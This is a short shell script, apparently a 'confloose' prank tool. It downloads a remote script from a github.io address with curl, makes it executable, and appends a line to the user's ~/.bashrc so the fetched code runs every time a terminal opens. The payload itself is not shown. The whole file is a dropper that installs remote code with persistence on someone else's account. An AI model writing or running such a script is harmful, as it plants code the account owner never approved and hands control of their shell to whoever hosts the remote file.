#!/bin/sh

tempdir=$(mktemp -d)
file="$tempdir/confloose-daemon-terminal"

curl "https://d-002.github.io/epita/confloose/daemon-terminal/daemon.sh" >> "$file"
chmod +x "$file"
echo "$file; test \"confloose by leo\"" >> "$HOME/.bashrc"
